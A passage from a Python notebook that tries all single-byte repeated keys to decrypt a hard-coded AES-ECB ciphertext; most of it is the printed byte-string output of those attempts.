      "b'\\xc9f\\xea\\xe0JkAc\\xf2\\xa0\\xcc\\xe7\\x98\\xc5n`\\xdd7&\\xdd\\xae=\\x89SS\\x08\\xe3w/\\xa7\\xab\\xc3\\xae\\x8a=\\x83hs\\x04[\\x0c\\x9d\\xee\\xfa\\xf3\\xc1}?f\\xad\\x07\\xb3{\\xb7\\x98R\\xa6\\xe20\\xd5\\xdd\\x1f\\x94\\xd0\\x84\\xed\\x94\\xeb\\xd4\\x90\\\\\\x10\\x11\\x03\\x84-\\xcc\\xc2a\\xb3'\n",
      "b'\\xa0\\x18\\xac>\\x19%k{H\\xcf\\xe4F\\xa1IN\\xa5\\x7f\\xde\\xf1f\\xf3\\x94~\\xc2\\xe2\\xade\\x1f\\xf03]dw\\xb04\\x83\\xae\\xa3\\xce\\x81om\\x1fX\\x1a\\xf4\\xaa\\xe6\\\\\\xba\\xb7F\\xfb\\xbb\\x199Pa\\xb9\\x14\\xbez\\xf9\\xe6;M\\xdf\\xf1m\\x89g>\\x86\\xd4\\x0bo\\xc8\\x00\\x15\\xb1'\n",
      "b'\\xf5\\xbb}\\xe5zMcB\\xa1)\\xd7\\xb4\\xdbS\\xfe\\xcd\\xc2\\x1c~^\\xe60\\xd4\\xd9z\\xd3X\\xde\\xe4<\\xd0\\x8fb\\t\\x1dc!\\xb4\\xc5KQddb@xF6qy\\x9a\\x02m\\xcd\\xf29\\xfe\\x15\\xeb\\x9f\\xacCC\\xe0j\\xc5\\x1c`P\\x8e\\xda\\x01\\xedG\\xa1\\xe8\\x12\\xc8 \\xa8'\n",
      "b'B\\xac\\xcc\\x1aOJ\\xb8r\\xd7s\\x8ed\\xb8\\xdbi3\\xd5\\x05\\xd2}\\xdd\\xa1\\x14JB\\xd3;8u\\x7fc\\x1a\\x10\\x94Hb\\xf8!\\x97\\x11\\x8e\\x89\\x0b;\\xb8`.f[\\x91\\xc6\\x95\\xc1;l\\x16x\\x19}!q#\\x92\\xe0y\\xbb\\xbc\\xeb\\xa8 \\x05\\xa5\\xbb\\xf2p\\x94hI\\x06N'\n",
      "b'r\\xc3\\x8c\\xcf\\xdd\\n\\xafMn\\x1d7[\\xa2*}\\xd2\\xe8(5Z\\x1av>\\xc2I\\xe5B4\\x19,\\xf4$IzO\\xf0\\xe6u\\xcb1\\x03\\x8eD\\x8di\\xbeiw\\r\\xf8\\x05&\\x8a\\x16\\x93:\\x8f\\xe9\\x92a$\\x84\\x0b\\xcc\\x1d\\xed\\xcd3\\xaf\\xd5\\xff\\x87\\xd6\\x04\\xcc\\xe03\\\\\\xa4\\xa6'\n",
      "b\"\\x98\\x91\\xc1\\x8dS'\\x10\\xa4\\xdc\\xe6\\xee\\x8b|FOY41\\xae\\xa9\\xebc\\x95\\x8b<\\x0e\\x0f\\xe8\\xb1\\x18\\xd0\\xa0\\x97s\\xa1\\xe6v\\x1b|n\\x80&2dw7DD\\x99\\xe2b\\xc8\\xed\\xc3HXkq\\xe9\\x13\\x98\\xc2\\x85\\\\\\x1c7\\xe4X\\x1b\\xcd\\t!\\xf2<\\xbc\\xf6\\x7f%x\\x83\"\n",
      "b'u\\xeb\\xf6%\\xc7\\xb3w\\xd9\\xc6\\xd3\\x12\\xf0\\x9b\\xd5\\xcb\\xb98M|\\xef\\xe7\\xfa\\xe8:\\xa8\\x84Dv\\x07Gg\\xd6\\xfc\\xd4l\\x1aN\\xe7\\xe7\\x1c\\xf87\\xdc\\xa2\\x0b\\x99\\xb6\\xbfLH+OgJH\\xc9\\x1c.\\x7fp@\\x86j(|\\x8b\\xe5\\xd7\\xfb\\xfe\\xb8\\x82m\\x0b\\x12#Wuk\\xbb'\n",
      "b'W\\x99b\\xfd\\x804\\xcb\\xbc\\x80\\x85]\\x03\\x8dx\\xdaJ\\xc4\\xc5\\xf7\\x11:\\x92\\x18=\\xb9\\x13*\\x01\\xd4x\\x97<,\\xec\"\\xa2C\\xff\\x15\"\\xe1\\xc3\\x1d\\xab\\xe7%\\xdfr\\x9abPr\\xee\\x99\\xb1\\x7f\\xe7+\\x98:\\xc9`*\\x81r/*O\\x01\\x8e\\xda\\xcc\\xfb\\xf2\\x14\\x1e\\xb2x5V'\n",
      "b\"p'\\xd7\\xfc\\xe4+\\xd1>\\x10E\\xb4\\x17\\xaa\\xabw6#$\\xf4\\x80Hn8\\xd8\\x91\\xd2\\x04\\x13\\xa7\\xa0\\x18\\xb9\\x88k\\xa3\\xf4\\x95\\x89\\xb2d\\xfd.H\\xad\\xda\\xf2\\x14\\xdd\\xc6L\\xbb\\xc0\\xc9(\\x96\\xf1\\xd1\\x8a\\xd8\\x1b\\xc3\\x06\\x11K\\xce}\\x0b:\\xb6\\xf8\\xb3\\x93\\xce&\\x8b\\xd3f\\x85\\x87k\"\n",
      "b'\\xf5!t\\xd6\\xb0\\x0f\\x9d\\xdej\\x14\\x93\\x0c$\\x8c\\x9c`y\\xa3\\x85V\\xb9\\xe9\\xcd\\x15)o\\x1a\"m)\\x07\\x83\\xa6\\xfb\\xaf\\xaf\\xfe\\xfd\\xccg\\x8b\\x9c\\xd4\\xe4F\\xfc\\x84\\xd4\\xc6>YLR\\xe7\\'\\xe0\\xb4\\x16\\xdco\\xf6\\x14C\\xa5/\\x02\"\\xf1`\\x82\\xc0=U\\x8672\\x19\\x99\\x86\\xf2'\n",
      "b'#\\xa8\\x8c\\x00j|\\xa8\\xa9\\xf5O\\x03\\x9b\\x9e~Z\\x99+ \\xb9\\xf0\\xd5J\\xbd\\x98,\\xb9\\x8f\\x9c<\\xe8\\xc1\\x00\\x9a2\\xc3\\xd7\\x81(\\x95>\\xc3\\x9e\\x1a\\x0b.M2\\xfa\\xbf8\\nS\\xb20\\x9a\\xfb\\xe32(\\xf4\\xa2C\\xee\\x93\\xde\\xb4Bd{\\xe2\\xb6\\x1a\\xa6B\\x8a1\\xedEj\\xc4'\n",
      "b'.Q\\xf9\\xe6\\x18\\x03\\xfb\\xff\\xe5@\\xb5\\x9c\\xcd(\\x0ee\\x15{\\x06H\\xe2\\xc3\\xa5\\xa4n\\xa9\\xa6\\x8d{\\xa5\\xc3\\xc2\\xe5\\x97\\xd5\\x80*\\xbbt\\x04\\xa1d \\x1e\\xd5[\\x85W\\xb6n\\xe7KN\\xe3\\x04\\x12\\xd1a\\x89+P qD\\xe5Z\\xf3\\xadBq\\xc3\\xdc\\xb4$\\x0c\\x8d\\xba\\x05\\xd3\\xff'\n",
      "b\"'v\\xbf(\\xd1$\\xed\\xa2$|H}f\\x04\\x1a\\xc4\\x02ZuF,x\\xf9\\x96t\\xccB\\xda\\xf8\\x97\\xf6\\xf1\\xb6\\x9d\\xcc\\x01\\x0b%\\x9az\\xde\\xd8^\\xc4\\x89\\xd3\\xcf\\x14\\x08J\\x07Q\\x07\\xf0{z\\xd2\\x0e%\\xe8\\x03\\xa9'\\x98\\xc9I\\xe0W\\xcb\\xdb\\x03W\\x01\\xc2\\x1d\\x8d<y\\n\\xa6\"\n",
      "b'x\\xd4)\\xc2\\xfe\\xd9+K{9Tj\\xe0f;\\x8c@5\\x1a#\\x9fh\\xd2J\\xcdX#R\\x9b\\xae\\xfc7V\\xb2\\x1a\\xe3\\xb0\\xce\\x9a\\xc7s\"&\\xf5\\xe3\\xe7\\xd5\\xd3\\xa2\\x97\\xd3\\xa1\\xb9=\\x87\\n\\x8bL\\x9al\\xe5\\xc7\\xbab\\x1b;\\x01\\xea\\xd5R#\\xbbZ\\x06I\\xdf\\xe8\\x9a\\x05\\x8a'\n",
      "b'\\xf0\\x98\\x8e0\\xe5`\\xa3\\xc5\\xfcqS\\xdf\\xb9\\xcf\\xfb\\xe1\\xa6\\x19\\xb2\\x0b\\x03\\x8a\\xf5\\x7f)\\x9cm\\xf8\\xd9=dz\\x8f\\x82\\xa1\\xc8\\x15F\\xe0U\\x8a\\x03\\xd5y\\xd2\\xfb\\xbe\\xa6\\xcd-\\xab\\xac\\xc6\\n\\x0c\\x99\\x8b\\xe8\\xb2V\\xf9N\\xb3^\\x927\\x9a\\\\CP\\xe8 \\xfe4\\xe4\\x99]_\\xb9F'\n",
      "b'\\xb1\\xbf\\xd2\\xd2\\x14\\xc1Y\\xf7\\x95\\x86E\\xfaF\\x1f\\xe9\\xb2\\x0e\\xa7\\xd3\\xad\\xa8G\\xd94jD\\xe2\\xee\\xf4~{m\\x17\\x08Z\\xb9\\x16\\x99\\xd5\\xa83\\x8a\\xd9\\x1a:\\xf46\\xee\\xf4\\x17\\xd3\"\\xc7JF\\xd9\\xack\\xfe\\xb2H\\x18J\\x0c9\\xde\\x11\\x8b\\x85\\xd1=:\\xf5\\xd8\\xff=gf\\x00\\xc6'\n",
      "b'\\x0b\\xda\\x97\\xa3J\\xd9J\\x97\\x00\\x835<\\xac}\\x1d\\xdd\\x00\\xc1\\xad\\xcfj-\\xf4T\\xfa\\xa8{\\x18\\xce|;\\x9c\\xdf\\x1f\\x88\\xe8\\x9c\\xd5\\xdc\\xce\\xd8{\\xe9\\xd9K\\x90V\\xea,\\x85m\\x12*\\xeb\\x00V-\\xdc\\xd7!Jy\\xb6\\xee\"\\x90\\xfd\\x80\\xb4\\xf5-\\x96\\x8b\\x7f*\\xea8\\x15\\xc5\\xd2'\n",
      "b' \\xbf\\xebY!\\xe5y\\x02\\x9dyxI\\x94\\xf1\\x167\\xb6 ]\\xecL\\x8a\\xf1\\xa5Y\\x9eo\\xa8\\x82\\xe3\\xf2\\xa5\\xa1<\\xcb\\xf4\\xc8]\\x08iL\\x11\\x8f\\xebT\\xc9n\\x15\\x8a\\xc8\\t\\x97i\\xb5\\xb6\\xa2\\xb2\\rYj\\xef*1\\xd9\\xe5\\x1e\\xf8i{\\xb8\\x90}\\xfaT\\xf8\\xc3#\\xeeE^'\n",
      "b'\\xcf\\xa03=\\x8c\\xb45\\xd4\\x07\\x0f\\xb8wIg\\xe4\\x88\\x17S\\xb9\\xf0:q\\x0f\\xeb\\xbfF\\x19W`\\xca\\xed\\x8d\\xba\\xabO\\xd8\\xf69\\xc5\\x9b\\x9cK|`\\x16\\n\\xb7\\x18\\xc1\\x00\\xd2!%\\xfa\\xd4<K!\\\\X\\x92\\xf0\\x9e-J\\xc1\\xc4;\\xfc35\\xbf\\xa39\\xf5\\xc1\\x0cI\\xd6\\x81'\n",
      "b'\\xece;t?K-\\xf9wX\\x12\\xedb\\x8eB\\x9e\\x87[\\x03xT\\xdf\\xf7j\\xeau\\r4\\xd21\\xb9\\xcf\\xd0\\x96\\xb5\\xa8\\x14\\x1e\\x08\\xaa\\xa9\\xab\\x1bHC\\xad\\xd9F\\xb4\\xd9\\x8dLP\\x00\\x90\\xf4\\x8a\\x9a\\x90\\xd3\\x03m\\x0b\\xc8\\xabz\\xee\\xfe\\xff\\x9e\\x89\\xa7\\x88CQ.\\xa4\\xd3\\x00\\xc6'\n",
      "b'\\xb3\\x11\\x80}\\xb5\\xb8:R\\xbbr\\xb6\\xe3]\\xe5\\xc1KZ\\xdd@l\\xc1\\x8b\\x8d<Y(\\x13\\xc7\\xd1\\xdd\\xee\\xe9Y\\x1d\\xbe]U\\x99T\\n\\xfd\\xbb\\xda\\x1f\\xb0\\x17v\\xd6\\x9f\\xb7s^\\x1az\\xacgv\\x82\\x83\\x01\"?#\\x00\\x81;z\\x05J\\x1dP\\x02\\xe4\\x84(\\xf7QK\\xc3\\x08'\n",
      "b\"\\x05\\x01\\n\\x9b\\xbcg\\x9e9\\xa4\\xf3\\xb2y\\x9f^\\xd5\\xf2\\x8c\\xaa\\xeb[T7\\xc2\\xfa'GH\\x93b\\xcfp\\xf7s\\x16\\x1f>\\x1d\\xff\\n\\x0b\\x08\\xfeG\\\\\\x80?\\x8cS\\x1fq\\xda\\xa9\\x89H\\xaf\\x1d[\\xc28q\\x04\\xe8\\xd9\\xd6\\x0e\\xb1\\\\p\\x07\\x11\\xdb\\xfa\\xb57|\\xdb8\\x8e\\xdco\"\n",
      "b'\\x93\\xe8\\xe3\\xd2\\xbb\\xf8\\xf4\\x97\\x97*\\xd6v\\xca\\x1f \\t\\xb3$\\x0c\\xde#\\x0e\\n\\xb66\\xe9\\x80id\\x1c\\xf5c\\x9a\\xfd\\xc8\\xc7\\xa1\\x13\\xc6sA\\xdefA\\x1a$1Y\\x8co>\\xe7\\xed\\x0e<W\\xed\\x82{\\xeak\\x9a\\x1a\\x1ca\\xc6\\xf8\\xd8\\x80\\x0b\\x121F\\xbe\\xab%[\\x12G\\xf4'\n",
      "b'\\xc5\\x88\\xf5\\xee\\xc1\\x1bj\\xfd\\xa5y\\x17Bn\\x05\\x8c\\xc9/\\x8e\\xdd[\\xad\\xfd\\xc0\\x010\\xfbs\\x1c\\x9aR\\xb0\\t\\xd67~\\xd2G&\\x01\\x9e\\xe7\\xf8z\\xee\\xd3\\xca\\x03t\\xf1\\x13\\xbe\\xd8\\x15\\x94\\x13(MD\\\\\\xfcQ\\xcf\\xe4]\\xd3b;S\\xab\\xb9\\x83\\xca}o\\x02\\xbevr\\xe3\\r'\n",
      "b'\\xce-\\x06\\x9c&\\xb5\\xa1\\xcbQ\\x03\\x0c\\x90h)\\xa87(\\xe9\\xb7<\\xb1&\\xb6<^\\x0f%\\x8d\\xbd\\x9fs\\xf46\\'\\xa7\\xc1\\x1a\"\\x8fh\\x143wW\\xb2m\\x90\\xa0\\xdbQ\\x16Ai\\x14d\\'4\\xfe\\x1e\\xf5\\xe8\\xa5\\xa6\\x89\\xc8\\x9e\\x9b*\\x96\\x93\\xd3\\x9c\\x86\\xe1\\x14{\\x80\\xa2T\\x8d'\n",
      "b\"\\x83~i\\x1e\\n\\xaf6\\xee\\x12?\\xc9\\xc5PG\\x05\\xccw\\x8a%Q\\xf3s\\x07\\xe4\\x9b\\xde+\\xb4_\\xf0%\\x8fo\\xdc\\xd0\\xf8I\\x89of\\xdb\\xd2\\xb6\\xd6;\\xe2\\xbbV\\xd7\\x17jSv\\x05\\x14;\\x85\\xc3'\\xadlas.\\xf8\\xed,(\\xbd\\x86\\xa5[\\x8f\\x8e\\xe6\\xcerP\\x95\\x15\"\n",
      "b'P1\\x99\\xf1\\xcb\\xad\\xa4\\xf1\\x91\\x98\\xacw\\xcb\\x8c}\\xbfO1\\x06\\xe9,\\xdeIV\\x8b0\\xc4\\x97\\xf9\\xd7nW\\xc5\\x05uH\\x16)\\xb5.\\xffc\\x9cld\\xf0.\\xc6\\x82\\xc4Y\\x8d}\\x90\\xee\\xa1\\x0c\\xc0\\x1b\\xc4\\x15Sj[-\\x05\\x8d\\x170\\xef|I\\xbe\\xa5o\\xcbo\\x08\\x9f\\x15'\n",
      "b'\\x84|\\x81\\xaa6Xu\\xf8hI\\x9f\\xe2Q\\xe4\\x8a\\x86c\\xf5\\x93\\xc2\\xc3@nO\\xc8K\\x7f\\x14?\\x86-q\\x97M\\xc9\\x12\\xcaTX\\xd2)\\xe2\\xaa5\\xf1/\\xf4\\x1e\\xbb\\xc6\\x99\\x1f\\xd8N\\n\\xd9\\xc9\\xcb\\xc0A\\xdc(\\xe0\\xcb$\\xa2\\xe6\\x7f\\x94\\xb3T_eVZ\\\\\\x1ch\\xe6\\xf8'\n",
      "b'$i\\xc3H\\x8fl-G\\xc3\\x91\\xbf\\xd5p\\x97~{i\\xd2\\xef\\x90,\\t\\xf4\\xa1N$\\x93F\\xb3\\x12e3e\\x84c\\x17a/\\xb3J[\\xbe`\\x08\\xaff.\\xdf/H~!L\\xfen+\\x93\\x87L\\xcf\\xc7\\x16p#\\t\\xac\\x84\\x8a!\\xe7H\\x1b\\x83\\x11M\\xa1\\x01\\xa3\\xc7\\xbd'\n",
      "b'\\xf7\\x1f\\xee\\xdc\\xdft\\xf7\\x028\\x7f\\x03\\x1b\\xb9/\\xd0\\xf0\\xa6\\x97\\x82\\xa0\\xcc\\xa0.Ok\\xc9\\x87\\xcdG\\x14\\x15\\xcd\"\\xa1\\xd7\\xd19]\\xbe\\x07q\\x90\\xcd\\xbf\\x8b^\\x06\\x1b\\xfd\\xd0\\xf4\\xf7*y#:iO\\x062\\x80\\x8e\\x0e[D\\x08r\\x85*\\x99\\xfd\\xd9\\xa3\\xa5\\xc1\\xed\\xfeZ\\\\i'\n",
      "b'\\xb7H\\xb5By\\x17\\xe7\\x8e\\xa5\\x1b!\\x10]p\\x9f\\x11F\\x84\\x8b\\xc8\\xb5\\xd3\\x91\\x87YQ\\xfao/\\x91\\xa1\\xa4\\xeb\\x06\\xac\\xcc\\x19\\xe8\\x84\\xfa>\\xf0\\xc9It\\xef\\xcf]\\xbaq\\xdc\\x96\\xcc\\xf6\\xc7\\xf5\\xf3\\xb0\\xb5\\xb3/\\xc8\\x00\\xbf~\\x111\\x9d8\\x07\\x84\\x91u\\r\\xec\\xfa\\x18\\xbe\\xfb\\xf7'\n",
      "b',J\\xcc\\x97\\xdaD\\xa5\\x0ca\\xbb\\x13\\xd0hj\\xff\\xe0\\xc7\\xcb\\x7fV\\xad\\xe2\\x8aj\\xe5\\xd8\\xe7\\x81\\x01\\xe6\\xbb\\'\"\\xc6_^\\'`C\\x85\\xa1\\xc8\\x84 \\x83\\xb6\\xf8\\x1c\\xc8\\x9a\\xd0{\\x92\\xb0\\xcb\\xa5\\xdc\\xac\\x81\\xe4\\xc5\\xfc77\\xf0\\x05o\\xe4\\xb2\\xab\\x1e\\xe0\\x18wH\\x1bB\\xbe\\x9e\\xfc'\n",
      "b'\\x15u\\xbc\\x91\\xf4|\\xcb\\xdfL\\x8a\\xc9v?\\x8dH\\x88I\\x10:*\\x04\\xfd\\xae~\\x02\\xee\\x9d\\xa1z\\x86&\\xb1\\xfc\\x1fn\\xc7\\x1c%\\x1f6\\xcd\\x05\\xd2J\\xcb\\x1b#\\x93\\xa3\\x18\\x02\\xa5\\x9aIn\\x95B\\xc2\\xb9\\x93\\xcdJ\\xfbOq\\x8d\\x18\\xe2\\x80 \\x19\\x1b>Y\\xc6v\\xa5B\\x1e\\xb5'\n",
      "b'\\xc0\\x94\\xacp\\x14\\xd7~\\x81\\xe6~\\xc3\\x07\\xe9\\xbb\\xbb\\x18v\\x90S\\xe0\\xb9C{\\xc50\\x02\\xa4\\xdehawKm$\\x91\\xd7\\x12Rr\\xe2R\\xbd\\xcc\\xda\\xad\\x84V\"/\\x8c\\xe72\\x8b\\x90]]\\xdf\\xc31\\xc9%z\\xf4\\xa5\\xef\\xf5\\xd9\\r\\to\\x19?\\xb1T\\x7f\\xd49\\x9d\\xc8g'\n",
      "b'\\xbam4%\\xabV]\\xc4\\xbc\\x05k\\x10\\xf3\\x1e\\r\\xaa\\x05\\xe6\\x14\\xe9}\\x9c\\x83\\xc2\\xc5\\x05\\xb8\\xce\\xa7\\xe4\\xe9\\x87\\x167\\x8f\\x9f\\x8f\\xac\\x00\\xc9\\xdc\\xe5b\\xb4o\\x15\\xb5\\x88\\xb6B\\xfb*\\xff\\x98\\x13\\x86\\xc1oq\\x8ej\\xbb\\x9a3/\\xda\\x08\\xd7{v\\xd9`\\x12\\xc3\\xe0f\\x8b\\x9d\\xd4\\x10'\n",
      "b'\\xa1I<\\xd8\\x18\\xc2\\x15\\xabh\\x83h9\\xf1\\xd6:\\xb6\\xce<z\\xe0\\xa6Hq\\xa9o)\\x9e\\xbd!Ch\\xf2\\x91\\xfeH\\xde\\nn\\xdeGe\\x83\\xf3\\xf6/\\x03\\xbc\\xf3u\\xa8OZ)\\xba\\xd2\\xdcSK\\x1c6%\\xc5\\x90\\xe1\\xc1Y\\x81x\\x8f\\xccc\\xf3\\x1a\\xc6\\x19\\xe6\\x998\\x95\\xd6'\n",
      "b\"3\\xee\\xcej\\xb5'\\x1dh\\x06\\xa2Q\\xeb\\x06\\x12\\xf2b\\x1a\\xc2\\xe7\\xf79\\x9c-\\x07\\x1f;A\\x17<\\xf9\\xf2_\\x18\\x08i*\\x06c\\t\\xe8\\x01\\r!m~\\xec[\\xaa\\xfc\\x91:\\xbeOH\\x88$\\xa8\\xe4\\x0f\\xd3&Xx\\x1c-^\\x9a\\xa8\\xe9\\x164\\x8ehV\\x81)\\x13\\xb5\\xea\\xd3\"\n",
      "b'H\\x08\\xc7`d%\\xf1\\xbd\\xd6\\xc7\\x0c\\xc8B\\xd1\\xa7W\\xd7\\x9d\\x11\\xd5eQ|\\x85\\x16\\xad\\xd0\\xa9\\xed\\x96\\xa6\\x00L\\xb8w\\xf9\\x16\\x9d\\xa7|\\xc4\\x9e)\\xa7\\x8a\\xa5u\\x0c 1\\x86\\x02\\x0b7p\\x01%\\xb5\\x94\\xab \\xb0\\xf0\\x15\\xdaE\\xab\\x95lf+s\\x8c\\xfeK/.S\\x94 '\n",
      "b'7\\xc0\\xcc\\xb5\\xa4\\xc5$\\x9a\\x9e\\xd3\\x8dXU\\x84\\x8aV\\xf9\\xcc<\\xebLD\\x89~\\x8e\\xdf\\x17\\x86\\xa8\\x82\\xddQ7!\\xf8j\\xf1u<zw\\x80\\x13\\x93\\xb3g.1g\\xca\\xe8`\\xae\\x0f^\\t\\x10\\xe1\\x86\\xc5\\x83\\x1b\\xf4QU/\\x82B\\xe6\\xf6OeY\\xf3\\x90\\xb3J\\xd7L\\xee'\n",
      "b\"j\\xf2\\xe0N\\xe6\\x0f\\x1e\\xc6D=s\\xc2\\xe5'\\xd7rm%\\xaa\\xd5\\xa5\\xc0\\xdc\\xaa\\xbd$\\xfa\\x05K\\xc44\\xeb\\xc6\\x967\\x84\\xec\\x17xl~\\xbe\\xd9\\x86\\xb1\\xaf\\xd7\\xd1\\xc8\\xab\\x1a\\xd9\\xadzP\\x0e\\xa8\\x94;\\xf9\\tMIb\\xa4\\x12\\xe7\\x94\\xc9\\xe78A\\xc6\\x8dp\\xd0\\x84C\\xc0\\x8a\"\n",
      "b'\\x12\\xa2\\xb0\\x93n\\x96\\xe5\\xb4\\x00\\t]\\x85\\xb8\\xa1\\x8d[P\\xec\\xbe\\xda!\\x14\\x80\\xdbO\\xac\\xe5\\x0e!\\xe0\\x81\\x13%\\x98\\x0bx%TG\\x11\\x19X<c\\x1f@\"XA\\n\\xfbd\\xe4\\xa8\\xccVO\\xa3\\x1e\\xf7;]b\\xa0\\xca\\x8b\\xdf\\xd72\\xab\\x0b\\xc5%*\\x1fQW\\xcb\\x90\\x1c'\n",
      "b\">@YqFp\\xb6\\x89\\x89E\\xf9\\xc1\\x80w\\x08\\xe6OC\\x1a\\x1e\\xb5`e\\xb9\\xaa[7\\x1a(\\x9e\\x81\\x1a`\\x9f\\x04\\x8d\\x8dkT3\\xb5\\xe0\\xa7\\x008\\xff\\\\\\xfeh\\xe16_\\x0b\\xdf\\xf0\\x86\\x06\\x9f.|Q\\x922'\\x8f\\xdd\\xd2\\x9b\\x83Z\\x1b0\\xe6\\xb4\\rk\\x16\\xdd,@\"\n",
      "b'\\xb0\\xad7?W\\x13\\x14\\x98\\x1f[\\xcb <!D\\x08-)xq|\\xeb\\x86\\xedF\\xb7[\\xa5{\\xed8\\x83o\\xe5\\xec\\xf7L\\x1e\\xf5\\xb9e-\\x14\\xa2\\xb3\\xfb\\xf5C\\xf8\\xdb\\xa6\\xfc\\x10\\x91\\xba\\xdam\\xda\\xe8\\x85\\xf0\\xa1\\xa2\\xcd\\xf6\\xc3x\\xc7\\x1b\\xecg\\xeb\\x11\\xe4\\x11d%\\xad\\x81\\x03'\n",
      "b'3\\xa7|x\\x1a|\\xe1\\xe3\\x9ej\\xf5,\\x1e\\x89_g2\\xdf\\xdb\\x81\\xa7\\xd7\\xb5\\xa3\\r\\xdd\\xe2\\xdc)\\xef|ocet\\xdcn\\xee}\\x18D\\x1cK\\x9a\\xd7\\x82\\x85\\x05wW;\\xf2\\x17Y\\xf9V\\xbc\\xbb\\x87\\x16\\xb7eS\\xce\\xf8\"@<\\xcd;![\\xcb\\x9c\\xf0\\x1e\\xd6P3\\xdf'\n"
     ]
    }
   ],
   "source": [
    "en = b\"\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xe8\\x7f\\xf6\\x0c\\x99\\xadr\\xcc\\xbd\\x94~4\\x17\\xa9\\x01(\\xa7~\\x8e\\xd1\\xaa\\xbe\\x0b]\\x05\\xc4\\xff\\xe6\\xac\\x14#\\xabG\\x8e\\xb1\\xa1\\xfe&\\x1a,l\\x15\\x06\\x11\\t\\xb3\\xfe\\xda\"\n",
    "\n",
    "for i in range(1, 256):\n",
    "    key = bytes([i]) * 16\n",
    "    cipher = AES.new(key, AES.MODE_ECB)\n",
    "    de = cipher.decrypt(en)\n",
    "    print(de)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
